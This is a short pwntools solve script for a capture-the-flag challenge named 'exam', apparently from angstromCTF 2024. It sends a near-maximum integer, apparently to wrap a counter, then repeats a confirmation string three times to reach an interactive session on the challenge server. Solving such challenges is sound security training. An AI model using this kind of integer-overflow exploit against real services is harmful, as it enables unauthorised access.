#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./exam_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc challs.actf.co 31322"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b main
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(bstr(0x7FFFFFFE))
    payload = b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.\n"
    
    for i in range(3):
        r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()